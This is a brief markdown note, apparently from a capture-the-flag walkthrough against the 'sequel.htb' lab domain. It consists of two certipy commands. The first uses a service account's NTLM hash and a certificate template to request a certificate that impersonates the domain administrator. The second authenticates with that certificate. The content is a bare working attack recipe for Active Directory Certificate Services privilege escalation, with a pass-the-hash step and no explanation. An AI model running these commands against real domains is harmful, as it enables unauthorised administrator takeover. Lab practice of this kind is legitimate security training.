
## requesting for upn(impersonating)

```bash

certipy req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb

```


## Authenticating using pfx

```bash

certipy auth -pfx administrator.pfx

```